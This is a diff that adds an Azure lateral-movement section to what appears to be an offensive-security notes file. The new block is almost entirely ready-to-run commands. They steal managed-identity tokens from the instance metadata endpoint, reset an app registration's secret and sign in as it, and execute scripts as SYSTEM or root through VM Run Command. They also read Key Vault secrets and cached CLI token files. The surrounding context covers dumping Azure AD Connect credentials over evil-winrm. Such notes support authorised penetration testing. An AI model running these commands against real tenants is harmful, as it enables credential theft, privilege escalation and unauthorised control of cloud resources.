@@ -167,6 +167,25 @@ Get-AzureVMExtensionSettings
 # Can reset credentials for service principals
 ```
 
+### Lateral movement — managed-identity token, app secret, Run Command
+
+```bash
+# Steal a managed-identity token from IMDS (same 169.254.169.254 as AWS; on-box or via SSRF)
+curl -s -H "Metadata: true" \
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+
+# Add a fresh secret to an app registration, then sign in as that application
+az ad app credential reset --id <APP_ID>
+az login --service-principal -u <APP_ID> -p <SECRET> --tenant <TENANT_ID>
+
+# Run Command on a VM — no SSH/WinRM, runs as SYSTEM/root (needs Microsoft.Compute/.../runCommand/action)
+az vm run-command invoke -g <RG> -n <VM> --command-id RunShellScript --scripts 'id'
+
+# Reuse credentials already on the box — Key Vault secrets and cached CLI tokens
+az keyvault secret show --vault-name <VAULT> --name <NAME>
+ls ~/.azure/ ; cat ~/.azure/msal_token_cache.json 2>/dev/null
+```
+
 ### Azure AD Connect — `(localdb)\.\ADSync` connection failure on WinRM
 
 **Symptom:** Running the canonical xpn `Get-AzureADCredentials.ps1` over evil-winrm fails with `SqlException: Unable to locate a Local Database Runtime installation.` even though `sqlservr.exe` runs as the AAD service account. The LocalDB runtime resolver is per-user-session and not exposed to the network logon.
